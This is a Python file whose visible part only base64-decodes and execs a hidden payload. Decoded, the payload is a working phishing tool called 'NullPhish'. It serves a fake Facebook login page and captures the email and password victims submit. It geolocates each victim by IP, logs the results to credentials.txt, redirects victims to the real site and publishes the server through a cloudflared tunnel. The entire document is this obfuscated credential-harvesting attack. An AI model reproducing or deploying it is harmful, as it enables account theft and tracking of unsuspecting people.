
import base64
import types
import sys

_encoded = """aW1wb3J0IGh0dHAuc2VydmVyCmltcG9ydCBzb2NrZXRzZXJ2ZXIKaW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IG9zCmltcG9ydCB0aHJlYWRpbmcKaW1wb3J0IHJlCmltcG9ydCB1cmxsaWIucGFyc2UKaW1wb3J0IGpzb24KZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZXRpbWUKZnJvbSBjb2xvcmFtYSBpbXBvcnQgaW5pdCwgRm9yZSwgU3R5bGUKaW1wb3J0IHJhbmRvbQppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IHRpbWUKaW1wb3J0IHN5cwppbXBvcnQgcHlzaG9ydGVuZXJzCmltcG9ydCB2YWxpZGF0b3JzCmltcG9ydCBiYXNlNjQKCmluaXQoYXV0b3Jlc2V0PVRydWUpCgpQT1JUID0gNTAwMApERUZBVUxUX1dFQl9ESVIgPSAiRmFjZWJvb2siCkNSRURFTlRJQUxTX0ZJTEUgPSAiY3JlZGVudGlhbHMudHh0IgpCQU5ORVJfRklMRSA9ICJiYW5uZXIudHh0IgpWRVJTSU9OID0gIjIuMSIKCmFzY2lpX2FydHMgPSBbCiAgICByIiIiCiBfX19fX19fICAgICAgICAuX18gIC5fXyBfX19fX19fX19fLl9fICAgIC5fXyAgICAgICAuX18gICAgIAogXCAgICAgIFwgIF9fIF9ffCAgfCB8ICB8XF9fX19fXyAgIFwgIHxfXyB8X198IF9fX19ffCAgfF9fICAKIC8gICB8ICAgXHwgIHwgIFwgIHwgfCAgfCB8ICAgICBfX18vICB8ICBcfCAgfC8gIF9fXy8gIHwgIFwgCi8gICAgfCAgICBcICB8ICAvICB8X3wgIHxffCAgICB8ICAgfCAgIFkgIFwgIHxcX19fIFx8ICAgWSAgXApcX19fX3xfXyAgL19fX18vfF9fX18vX19fXy9fX19ffCAgIHxfX198ICAvX18vX19fXyAgPl9fX3wgIC8KICAgICAgICBcLyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwvICAgICAgICBcLyAgICAgXC8gCiAgICAgCiAgICAiIiIKXQoKZGVmIHByaW50X2Jhbm5lcigpOgogICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICBwcmludChGb3JlLlJFRCArIHJhbmRvbS5jaG9pY2UoYXNjaWlfYXJ0cykpCiAgICBwcmludChGb3JlLkNZQU4gKyBmIlsqXSBOdWxsUGhpc2ggdntWRVJTSU9OfSAtIFBoaXNoaW5nIFRvb2wiKQogICAgcHJpbnQoRm9yZS5DWUFOICsgIlsqXSBVc2UgcmVzcG9uc2libHkgZm9yIGVkdWNhdGlvbmFsIHB1cnBvc2VzIG9ubHkiKQogICAgcHJpbnQoRm9yZS5CTFVFICsgIlsqXSBDcmVhdGVkIGJ5OiBARG96ZXJNeCBOU04gTnVsbCBTaWduYWwgTmV0d29yayIpCiAgICBwcmludChGb3JlLkNZQU4gKyAiWypdIFByZXNzIEN0cmwrQyB0byBleGl0XG4iKQogICAgCiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKEJBTk5FUl9GSUxFLCAiciIpIGFzIGZpbGU6CiAgICAgICAgICAgIGJhbm5lciA9IGZpbGUucmVhZCgpCiAgICAgICAgICAgIHByaW50KEZvcmUuWUVMTE9XICsgYmFubmVyKQogICAgZXhjZXB0IEZpbGVOb3RGb3VuZEVycm9yOgogICAgICAgIHBhc3MKICAgIAogICAgcHJpbnQoRm9yZS5XSElURSArICItIiAqIDYwKQoKZGVmIGdldF9nZW9sb2NhdGlvbihpcCk6CiAgICB0cnk6CiAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQoZiJodHRwczovL2lwaW5mby5pby97aXB9L2pzb24iLCB0aW1lb3V0PTUpCiAgICAgICAgaWYgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgICAgICBkYXRhID0gcmVzcG9uc2UuanNvbigpCiAgICAgICAgICAgIHJldHVybiB7CiAgICAgICAgICAgICAgICAiY291bnRyeSI6IGRhdGEuZ2V0KCJjb3VudHJ5IiwgIk4vQSIpLAogICAgICAgICAgICAgICAgInJlZ2lvbiI6IGRhdGEuZ2V0KCJyZWdpb24iLCAiTi9BIiksCiAgICAgICAgICAgICAgICAiY2l0eSI6IGRhdGEuZ2V0KCJjaXR5IiwgIk4vQSIpLAogICAgICAgICAgICAgICAgIm9yZyI6IGRhdGEuZ2V0KCJvcmciLCAiTi9BIiksCiAgICAgICAgICAgICAgICAibG9jIjogZGF0YS5nZXQoImxvYyIsICJOL0EiKSwKICAgICAgICAgICAgICAgICJ0aW1lem9uZSI6IGRhdGEuZ2V0KCJ0aW1lem9uZSIsICJOL0EiKSwKICAgICAgICAgICAgICAgICJwb3N0YWwiOiBkYXRhLmdldCgicG9zdGFsIiwgIk4vQSIpCiAgICAgICAgICAgIH0KICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgcGFzcwogICAgCiAgICByZXR1cm4gewogICAgICAgICJjb3VudHJ5IjogIk4vQSIsICJyZWdpb24iOiAiTi9BIiwgImNpdHkiOiAiTi9BIiwgCiAgICAgICAgIm9yZyI6ICJOL0EiLCAibG9jIjogIk4vQSIsICJ0aW1lem9uZSI6ICJOL0EiLCAicG9zdGFsIjogIk4vQSIKICAgIH0KCmRlZiBzYXZlX2NyZWRlbnRpYWxzKGRhdGEpOgogICAgZGlyZWN0b3J5ID0gb3MucGF0aC5kaXJuYW1lKENSRURFTlRJQUxTX0ZJTEUpCiAgICBpZiBkaXJlY3RvcnkgYW5kIG5vdCBvcy5wYXRoLmV4aXN0cyhkaXJlY3RvcnkpOgogICAgICAgIG9zLm1ha2VkaXJzKGRpcmVjdG9yeSkKICAgICAgICAKICAgIHdpdGggb3BlbihDUkVERU5USUFMU19GSUxFLCAiYSIpIGFzIGNyZWRzOgogICAgICAgIGNyZWRzLndyaXRlKCItIiAqIDUwICsgIlxuIikKICAgICAgICBmb3Iga2V5LCB2YWx1ZSBpbiBkYXRhLml0ZW1zKCk6CiAgICAgICAgICAgIGNyZWRzLndyaXRlKGYie2tleX06IHt2YWx1ZX1cbiIpCiAgICAgICAgY3JlZHMud3JpdGUoIi0iICogNTAgKyAiXG5cbiIpCgpkZWYgZGlzcGxheV9jcmVkZW50aWFscyhkYXRhKToKICAgIHByaW50X2Jhbm5lcigpCiAgICBwcmludChGb3JlLkdSRUVOICsgZiJcblsrXSBGZWNoYToge2RhdGFbJ2RhdGUnXX0iKQogICAgcHJpbnQoRm9yZS5DWUFOICsgZiJbK10gSVA6IHtkYXRhWydpcCddfSIpCiAgICBwcmludChGb3JlLkJMVUUgKyBmIlsrXSBQYcOtczoge2RhdGFbJ2NvdW50cnknXX0iKQogICAgcHJpbnQoRm9yZS5ZRUxMT1cgKyBmIlsrXSBSZWdpw7NuOiB7ZGF0YVsncmVnaW9uJ119IikKICAgIHByaW50KEZvcmUuWUVMTE9XICsgZiJbK10gQ2l1ZGFkOiB7ZGF0YVsnY2l0eSddfSIpCiAgICBwcmludChGb3JlLk1BR0VOVEEgKyBmIlsrXSBJU1A6IHtkYXRhWydpc3AnXX0iKQogICAgcHJpbnQoRm9yZS5XSElURSArIGYiWytdIFpvbmEgSG9yYXJpYToge2RhdGFbJ3RpbWV6b25lJ119IikKICAgIHByaW50KEZvcmUuV0hJVEUgKyBmIlsrXSBDw7NkaWdvIFBvc3RhbDoge2RhdGFbJ3Bvc3RhbCddfSIpCiAgICBwcmludChGb3JlLldISVRFICsgZiJbK10gTGF0aXR1ZC9Mb25naXR1ZDoge2RhdGFbJ2xvY2F0aW9uJ119IikKICAgIHByaW50KEZvcmUuWUVMTE9XICsgZiJbK10gQ29ycmVvOiB7ZGF0YVsnZW1haWwnXX0iKQogICAgcHJpbnQoRm9yZS5ZRUxMT1cgKyBmIlsrXSBDb250cmFzZcOxYToge2RhdGFbJ3Bhc3N3b3JkJ119IikKICAgIHByaW50KEZvcmUuTUFHRU5UQSArIGYiWytdIFVzZXItQWdlbnQ6IHtkYXRhWyd1c2VyX2FnZW50J119IikKICAgIHByaW50KEZvcmUuV0hJVEUgKyBmIlsrXSBQbGF0YWZvcm1hOiB7ZGF0YVsncGxhdGZvcm0nXX0iKQogICAgcHJpbnQoRm9yZS5XSElURSArICItIiAqIDYwKQogICAgcHJpbnQoRm9yZS5HUkVFTiArICJbKl0gQ3JlZGVuY2lhbGVzIGNhcHR1cmFkYXMgeSBhbG1hY2VuYWRhcyBjb3JyZWN0YW1lbnRlLlxuIikKICAgIAogICAgYWJzX3BhdGggPSBvcy5wYXRoLmFic3BhdGgoQ1JFREVOVElBTFNfRklMRSkKICAgIHByaW50KEZvcmUuV0hJVEUgKyBmIlsqXSBHdWFyZGFkbyBlbjoge2Fic19wYXRofVxuIikKCmRlZiBkZXRlY3RfcGxhdGZvcm0odXNlcl9hZ2VudCk6CiAgICB1YSA9IHVzZXJfYWdlbnQubG93ZXIoKQogICAgaWYgImlwaG9uZSIgaW4gdWEgb3IgImlwYWQiIGluIHVhOgogICAgICAgIHJldHVybiAiaU9TIgogICAgZWxpZiAiYW5kcm9pZCIgaW4gdWE6CiAgICAgICAgcmV0dXJuICJBbmRyb2lkIgogICAgZWxpZiAid2luZG93cyIgaW4gdWE6CiAgICAgICAgcmV0dXJuICJXaW5kb3dzIgogICAgZWxpZiAibWFjaW50b3NoIiBpbiB1YSBvciAibWFjIG9zIiBpbiB1YToKICAgICAgICByZXR1cm4gIm1hY09TIgogICAgZWxpZiAibGludXgiIGluIHVhOgogICAgICAgIHJldHVybiAiTGludXgiCiAgICBlbHNlOgogICAgICAgIHJldHVybiAiVW5rbm93biIKCmNsYXNzIFBoaXNoaW5nSGFuZGxlcihodHRwLnNlcnZlci5TaW1wbGVIVFRQUmVxdWVzdEhhbmRsZXIpOgogICAgZGVmIGRvX0dFVChzZWxmKToKICAgICAgICBpZiBzZWxmLnBhdGggIT0gIi9mYXZpY29uLmljbyI6CiAgICAgICAgICAgIGlwID0gc2VsZi5oZWFkZXJzLmdldCgnWC1Gb3J3YXJkZWQtRm9yJywgc2VsZi5jbGllbnRfYWRkcmVzc1swXSkKICAgICAgICAgICAgdXNlcl9hZ2VudCA9IHNlbGYuaGVhZGVycy5nZXQoJ1VzZXItQWdlbnQnLCAnVW5rbm93bicpCiAgICAgICAgICAgIHByaW50KEZvcmUuQ1lBTiArIGYiWypdIFZpc2l0YSBkZSB7aXB9ICh7ZGV0ZWN0X3BsYXRmb3JtKHVzZXJfYWdlbnQpfSkiKQogICAgICAgICAgICAKICAgICAgICBzdXBlcigpLmRvX0dFVCgpCiAgICAgICAgCiAgICBkZWYgZG9fUE9TVChzZWxmKToKICAgICAgICBpZiBzZWxmLnBhdGggPT0gJy9sb2dpbic6CiAgICAgICAgICAgIGNvbnRlbnRfbGVuZ3RoID0gaW50KHNlbGYuaGVhZGVyc1snQ29udGVudC1MZW5ndGgnXSkKICAgICAgICAgICAgcG9zdF9kYXRhID0gc2VsZi5yZmlsZS5yZWFkKGNvbnRlbnRfbGVuZ3RoKQogICAgICAgICAgICBmb3JtX2RhdGEgPSB1cmxsaWIucGFyc2UucGFyc2VfcXMocG9zdF9kYXRhLmRlY29kZSgpKQogICAgICAgICAgICAKICAgICAgICAgICAgaXAgPSBzZWxmLmhlYWRlcnMuZ2V0KCdYLUZvcndhcmRlZC1Gb3InLCBzZWxmLmNsaWVudF9hZGRyZXNzWzBdKQogICAgICAgICAgICB1c2VyX2FnZW50ID0gc2VsZi5oZWFkZXJzLmdldCgnVXNlci1BZ2VudCcsICdVbmtub3duJykKICAgICAgICAgICAgbm93ID0gZGF0ZXRpbWUubm93KCkuc3RyZnRpbWUoIiVZLSVtLSVkICVIOiVNOiVTIikKICAgICAgICAgICAgCiAgICAgICAgICAgIGdlb19kYXRhID0gZ2V0X2dlb2xvY2F0aW9uKGlwKQogICAgICAgICAgICAKICAgICAgICAgICAgY3JlZGVudGlhbHNfZGF0YSA9IHsKICAgICAgICAgICAgICAgICJkYXRlIjogbm93LAogICAgICAgICAgICAgICAgImlwIjogaXAsCiAgICAgICAgICAgICAgICAiZW1haWwiOiBmb3JtX2RhdGEuZ2V0KCdlbWFpbCcsIFsnJ10pWzBdLAogICAgICAgICAgICAgICAgInBhc3N3b3JkIjogZm9ybV9kYXRhLmdldCgncGFzc3dvcmQnLCBbJyddKVswXSwKICAgICAgICAgICAgICAgICJ1c2VyX2FnZW50IjogdXNlcl9hZ2VudCwKICAgICAgICAgICAgICAgICJwbGF0Zm9ybSI6IGRldGVjdF9wbGF0Zm9ybSh1c2VyX2FnZW50KSwKICAgICAgICAgICAgICAgICJjb3VudHJ5IjogZ2VvX2RhdGFbImNvdW50cnkiXSwKICAgICAgICAgICAgICAgICJyZWdpb24iOiBnZW9fZGF0YVsicmVnaW9uIl0sCiAgICAgICAgICAgICAgICAiY2l0eSI6IGdlb19kYXRhWyJjaXR5Il0sCiAgICAgICAgICAgICAgICAiaXNwIjogZ2VvX2RhdGFbIm9yZyJdLAogICAgICAgICAgICAgICAgImxvY2F0aW9uIjogZ2VvX2RhdGFbImxvYyJdLAogICAgICAgICAgICAgICAgInRpbWV6b25lIjogZ2VvX2RhdGFbInRpbWV6b25lIl0sCiAgICAgICAgICAgICAgICAicG9zdGFsIjogZ2VvX2RhdGFbInBvc3RhbCJdCiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgIHNhdmVfY3JlZGVudGlhbHMoY3JlZGVudGlhbHNfZGF0YSkKICAgICAgICAgICAgZGlzcGxheV9jcmVkZW50aWFscyhjcmVkZW50aWFsc19kYXRhKQogICAgICAgICAgICAKICAgICAgICAgICAgc2VsZi5zZW5kX3Jlc3BvbnNlKDMwMSkKICAgICAgICAgICAgc2VsZi5zZW5kX2hlYWRlcignTG9jYXRpb24nLCAnaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luLnBocD9sb2dpbl9hdHRlbXB0PTEnKQogICAgICAgICAgICBzZWxmLmVuZF9oZWFkZXJzKCkKICAgICAgICBlbHNlOgogICAgICAgICAgICBzZWxmLnNlbmRfZXJyb3IoNDA0KQoKICAgIGRlZiBsb2dfbWVzc2FnZShzZWxmLCBmb3JtYXQsICphcmdzKToKICAgICAgICByZXR1cm4KCmRlZiBzdGFydF9zZXJ2ZXIod2ViX2Rpcik6CiAgICB0cnk6CiAgICAgICAgb3MuY2hkaXIod2ViX2RpcikKICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjoKICAgICAgICBwcmludChGb3JlLlJFRCArIGYiWyFdIEVycm9yOiBEaXJlY3RvcnkgJ3t3ZWJfZGlyfScgbm90IGZvdW5kIikKICAgICAgICBzeXMuZXhpdCgxKQogICAgICAgIAogICAgdHJ5OgogICAgICAgIGhhbmRsZXIgPSBQaGlzaGluZ0hhbmRsZXIKICAgICAgICB3aXRoIHNvY2tldHNlcnZlci5UQ1BTZXJ2ZXIoKCIiLCBQT1JUKSwgaGFuZGxlcikgYXMgaHR0cGQ6CiAgICAgICAgICAgIHByaW50KEZvcmUuR1JFRU4gKyBmIlsrXSBTZXJ2aWRvciBIVFRQIGluaWNpYWRvIGVuIGVsIHB1ZXJ0byB7UE9SVH0iKQogICAgICAgICAgICBodHRwZC5zZXJ2ZV9mb3JldmVyKCkKICAgIGV4Y2VwdCBPU0Vycm9yIGFzIGU6CiAgICAgICAgaWYgZS5lcnJubyA9PSA5ODoKICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyBmIlshXSBFcnJvcjogUHVlcnRvIHtQT1JUfSB5YSBlc3TDoSBlbiB1c28iKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgZiJbIV0gRXJyb3IgYWwgaW5pY2lhciBzZXJ2aWRvcjoge2V9IikKICAgICAgICBzeXMuZXhpdCgxKQoKZGVmIHN0YXJ0X2Nsb3VkZmxhcmVkKCk6CiAgICB0cnk6CiAgICAgICAgcHJpbnQoRm9yZS5ZRUxMT1cgKyAiWytdIENyZWFuZG8gdMO6bmVsIGNvbiBDbG91ZGZsYXJlLi4uIikKICAgICAgICAKICAgICAgICB0cnk6CiAgICAgICAgICAgIHN1YnByb2Nlc3MucnVuKFsiY2xvdWRmbGFyZWQiLCAiLS12ZXJzaW9uIl0sIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUsIHN0ZGVycj1zdWJwcm9jZXNzLlBJUEUsIGNoZWNrPVRydWUpCiAgICAgICAgZXhjZXB0IChzdWJwcm9jZXNzLkNhbGxlZFByb2Nlc3NFcnJvciwgRmlsZU5vdEZvdW5kRXJyb3IpOgogICAgICAgICAgICBwcmludChGb3JlLlJFRCArICJbIV0gRXJyb3I6ICdjbG91ZGZsYXJlZCcgbm8gZXN0w6EgaW5zdGFsYWRvIG8gbm8gc2UgZW5jdWVudHJhIGVuIGVsIFBBVEgiKQogICAgICAgICAgICBwcmludChGb3JlLllFTExPVyArICJbKl0gSW5zdGFsYSBjb246ICdhcHQgaW5zdGFsbCBjbG91ZGZsYXJlZCcgbyBkZXNjw6FyZ2FsbyBkZXNkZSBodHRwczovL2RldmVsb3BlcnMuY2xvdWRmbGFyZS5jb20vY2xvdWRmbGFyZS1vbmUvY29ubmVjdGlvbnMvY29ubmVjdC1hcHBzL2luc3RhbGwtYW5kLXNldHVwL2luc3RhbGxhdGlvbiIpCiAgICAgICAgICAgIHN5cy5leGl0KDEpCiAgICAgICAgCiAgICAgICAgY2xvdWRmbGFyZWQgPSBzdWJwcm9jZXNzLlBvcGVuKAogICAgICAgICAgICBbImNsb3VkZmxhcmVkIiwgInR1bm5lbCIsICItLXVybCIsIGYiaHR0cDovL2xvY2FsaG9zdDp7UE9SVH0iXSwKICAgICAgICAgICAgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwKICAgICAgICAgICAgc3RkZXJyPXN1YnByb2Nlc3MuU1RET1VULAogICAgICAgICAgICB0ZXh0PVRydWUKICAgICAgICApCiAgICAgICAgCiAgICAgICAgcHJpbnQoRm9yZS5ZRUxMT1cgKyAiWypdIEVzcGVyYW5kbyBVUkwgZGVsIHTDum5lbC4uLiIpCiAgICAgICAgZm91bmRfdXJsID0gRmFsc2UKICAgICAgICBzdGFydF90aW1lID0gdGltZS50aW1lKCkKICAgICAgICAKICAgICAgICB3aGlsZSBub3QgZm91bmRfdXJsIGFuZCB0aW1lLnRpbWUoKSAtIHN0YXJ0X3RpbWUgPCA2MDoKICAgICAgICAgICAgbGluZSA9IGNsb3VkZmxhcmVkLnN0ZG91dC5yZWFkbGluZSgpCiAgICAgICAgICAgIGlmIG5vdCBsaW5lOgogICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICBpZiAidHJ5Y2xvdWRmbGFyZS5jb20iIGluIGxpbmU6CiAgICAgICAgICAgICAgICB1cmxfbWF0Y2ggPSByZS5zZWFyY2gociIoaHR0cHM/Oi8vW2EtekEtWjAtOS1dK1wudHJ5Y2xvdWRmbGFyZVwuY29tW15ccywpXSopIiwgbGluZSkKICAgICAgICAgICAgICAgIGlmIHVybF9tYXRjaDoKICAgICAgICAgICAgICAgICAgICBmaW5hbF91cmwgPSB1cmxfbWF0Y2guZ3JvdXAoMSkKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLkdSRUVOICsgZiJbK10gVHUgdMO6bmVsIHDDumJsaWNvOiB7Rm9yZS5DWUFOfXtmaW5hbF91cmx9e0ZvcmUuR1JFRU59IikKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIHN1YnByb2Nlc3MucnVuKFsidGVybXV4LWNsaXBib2FyZC1zZXQiXSwgaW5wdXQ9ZmluYWxfdXJsLCB0ZXh0PVRydWUsIGNoZWNrPVRydWUpCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuR1JFRU4gKyAiWytdIFVSTCBjb3BpYWRhIGF1dG9tw6F0aWNhbWVudGUgYWwgcG9ydGFwYXBlbGVzLiIpCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0IChzdWJwcm9jZXNzLlN1YnByb2Nlc3NFcnJvciwgRmlsZU5vdEZvdW5kRXJyb3IpOgogICAgICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLllFTExPVyArICJbIV0gTm8gc2UgcHVkbyBjb3BpYXIgYXV0b23DoXRpY2FtZW50ZS4gQ29waWEgbWFudWFsbWVudGUgbGEgVVJMLiIpCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgZm91bmRfdXJsID0gVHJ1ZQogICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgCiAgICAgICAgaWYgbm90IGZvdW5kX3VybDoKICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAiWyFdIFRpZW1wbyBkZSBlc3BlcmEgYWdvdGFkbyBwYXJhIG9idGVuZXIgbGEgVVJMIGRlbCB0w7puZWwiKQogICAgICAgICAgICBjbG91ZGZsYXJlZC50ZXJtaW5hdGUoKQogICAgICAgICAgICBzeXMuZXhpdCgxKQogICAgICAgICAgICAKICAgICAgICB0cnk6CiAgICAgICAgICAgIGNsb3VkZmxhcmVkLndhaXQoKQogICAgICAgIGV4Y2VwdCBLZXlib2FyZEludGVycnVwdDoKICAgICAgICAgICAgY2xvdWRmbGFyZWQudGVybWluYXRlKCkKICAgICAgICAgICAgcHJpbnQoRm9yZS5ZRUxMT1cgKyAiXG5bIV0gVMO6bmVsIGRlIENsb3VkZmxhcmUgdGVybWluYWRvIikKCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyBmIlshXSBFcnJvciBhbCBpbmljaWFyIGNsb3VkZmxhcmVkOiB7ZX0iKQogICAgICAgIHN5cy5leGl0KDEpCgpkZWYgc2V0dXBfd2ViX2RpcmVjdG9yeSgpOgogICAgaWYgbGVuKHN5cy5hcmd2KSA+IDE6CiAgICAgICAgd2ViX2RpciA9IHN5cy5hcmd2WzFdCiAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHdlYl9kaXIpOgogICAgICAgICAgICBwcmludChGb3JlLlJFRCArIGYiWyFdIEVycm9yOiBEaXJlY3RvcmlvICd7d2ViX2Rpcn0nIG5vIGVuY29udHJhZG8iKQogICAgICAgICAgICBzeXMuZXhpdCgxKQogICAgICAgIHJldHVybiB3ZWJfZGlyCiAgICByZXR1cm4gREVGQVVMVF9XRUJfRElSCgpkZWYgY2hlY2tfZGVwZW5kZW5jaWVzKCk6CiAgICBtaXNzaW5nX2RlcHMgPSBbXQogICAgCiAgICB0cnk6CiAgICAgICAgaW1wb3J0IHB5c2hvcnRlbmVycwogICAgZXhjZXB0IEltcG9ydEVycm9yOgogICAgICAgIG1pc3NpbmdfZGVwcy5hcHBlbmQoInB5c2hvcnRlbmVycyIpCiAgICAKICAgIHRyeToKICAgICAgICBpbXBvcnQgdmFsaWRhdG9ycwogICAgZXhjZXB0IEltcG9ydEVycm9yOgogICAgICAgIG1pc3NpbmdfZGVwcy5hcHBlbmQoInZhbGlkYXRvcnMiKQogICAgCiAgICBpZiBtaXNzaW5nX2RlcHM6CiAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAiWyFdIERlcGVuZGVuY2lhcyBmYWx0YW50ZXM6ICIgKyAiLCAiLmpvaW4obWlzc2luZ19kZXBzKSkKICAgICAgICBpbnN0YWxsID0gaW5wdXQoRm9yZS5ZRUxMT1cgKyAiWz9dIMK/UXVpZXJlcyBpbnN0YWxhcmxhcyBhaG9yYT8gKHMvbik6ICIpLnN0cmlwKCkubG93ZXIoKQogICAgICAgIAogICAgICAgIGlmIGluc3RhbGwgPT0gInMiIG9yIGluc3RhbGwgPT0gInNpIiBvciBpbnN0YWxsID09ICJ5IiBvciBpbnN0YWxsID09ICJ5ZXMiOgogICAgICAgICAgICBwcmludChGb3JlLllFTExPVyArICJbKl0gSW5zdGFsYW5kbyBkZXBlbmRlbmNpYXMuLi4iKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBzdWJwcm9jZXNzLnJ1bihbc3lzLmV4ZWN1dGFibGUsICItbSIsICJwaXAiLCAiaW5zdGFsbCJdICsgbWlzc2luZ19kZXBzLCBjaGVjaz1UcnVlKQogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5HUkVFTiArICJbK10gRGVwZW5kZW5jaWFzIGluc3RhbGFkYXMgY29ycmVjdGFtZW50ZS4iKQogICAgICAgICAgICAgICAgaW1wb3J0IGltcG9ydGxpYgogICAgICAgICAgICAgICAgZm9yIGRlcCBpbiBtaXNzaW5nX2RlcHM6CiAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICBpbXBvcnRsaWIuaW1wb3J0X21vZHVsZShkZXApCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEltcG9ydEVycm9yOgogICAgICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArIGYiWyFdIEVycm9yIGFsIGltcG9ydGFyIHtkZXB9IGRlc3B1w6lzIGRlIGxhIGluc3RhbGFjacOzbi4gSW50ZW50YSBpbnN0YWxhciBtYW51YWxtZW50ZSBjb246IHBpcCBpbnN0YWxsIHtkZXB9IikKICAgICAgICAgICAgICAgICAgICAgICAgc3lzLmV4aXQoMSkKICAgICAgICAgICAgZXhjZXB0IHN1YnByb2Nlc3MuQ2FsbGVkUHJvY2Vzc0Vycm9yOgogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAiWyFdIEVycm9yIGFsIGluc3RhbGFyIGRlcGVuZGVuY2lhcy4gSW50ZW50YSBpbnN0YWxhciBtYW51YWxtZW50ZSBjb246IikKICAgICAgICAgICAgICAgIHByaW50KEZvcmUuV0hJVEUgKyBmIiAgcGlwIGluc3RhbGwgeycgJy5qb2luKG1pc3NpbmdfZGVwcyl9IikKICAgICAgICAgICAgICAgIHN5cy5leGl0KDEpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAiWyFdIExhcyBkZXBlbmRlbmNpYXMgc29uIG5lY2VzYXJpYXMgcGFyYSBlbCBmdW5jaW9uYW1pZW50byBjb21wbGV0byBkZWwgc2NyaXB0LiIpCiAgICAgICAgICAgIHByaW50KEZvcmUuV0hJVEUgKyBmIiAgSW5zdGFsYSBtYW51YWxtZW50ZSBjb246IHBpcCBpbnN0YWxsIHsnICcuam9pbihtaXNzaW5nX2RlcHMpfSIpCiAgICAgICAgICAgIHN5cy5leGl0KDEpCgpkZWYgbWFpbigpOgogICAgdHJ5OgogICAgICAgIHByaW50X2Jhbm5lcigpCiAgICAgICAgCiAgICAgICAgY2hlY2tfZGVwZW5kZW5jaWVzKCkKICAgICAgICAKICAgICAgICB3ZWJfZGlyID0gc2V0dXBfd2ViX2RpcmVjdG9yeSgpCiAgICAgICAgcHJpbnQoRm9yZS5DWUFOICsgZiJbKl0gVXNhbmRvIHBsYW50aWxsYToge3dlYl9kaXJ9IikKICAgICAgICAKICAgICAgICBzZXJ2ZXJfdGhyZWFkID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9c3RhcnRfc2VydmVyLCBhcmdzPSh3ZWJfZGlyLCkpCiAgICAgICAgc2VydmVyX3RocmVhZC5kYWVtb24gPSBUcnVlCiAgICAgICAgc2VydmVyX3RocmVhZC5zdGFydCgpCiAgICAgICAgCiAgICAgICAgdGltZS5zbGVlcCgxKQogICAgICAgIAogICAgICAgIHN0YXJ0X2Nsb3VkZmxhcmVkKCkKICAgICAgICAKICAgIGV4Y2VwdCBLZXlib2FyZEludGVycnVwdDoKICAgICAgICBwcmludChGb3JlLllFTExPVyArICJcblsqXSBQcm9ncmFtYSB0ZXJtaW5hZG8gcG9yIGVsIHVzdWFyaW8iKQogICAgICAgIHN5cy5leGl0KDApCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgbWFpbigp"""
_decoded = base64.b64decode(_encoded).decode('utf-8')
compiled = compile(_decoded, "<string>", "exec")
exec(compiled)
